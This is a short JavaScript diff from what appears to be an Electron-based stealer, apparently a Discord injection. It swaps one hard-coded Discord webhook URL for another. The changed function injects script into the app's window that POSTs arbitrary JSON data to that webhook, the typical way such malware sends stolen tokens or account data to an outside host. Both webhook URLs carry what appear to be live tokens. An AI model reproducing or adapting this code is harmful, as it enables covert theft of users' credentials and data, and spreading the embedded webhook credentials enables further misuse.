@@ -122,7 +122,7 @@ function SendToWebhook(what) {
 function SendToWebhookk(what) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://discord.com/api/webhooks/906007438032003103/7yT3PcezNFeMVU7tnN1jy6qmYq_AqyUmIkieI4aTV3qPnSglv8OH75Ha1--iWwUnpyrE", true);
+    xhr.open("POST", "https://discord.com/api/webhooks/906349479618281563/kBaKkRWszKBBJmm4m-utIdgvdlvQWljH2MR7st7eHbHAFc_3KLJnuw3ISJC4UNopfkD_", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
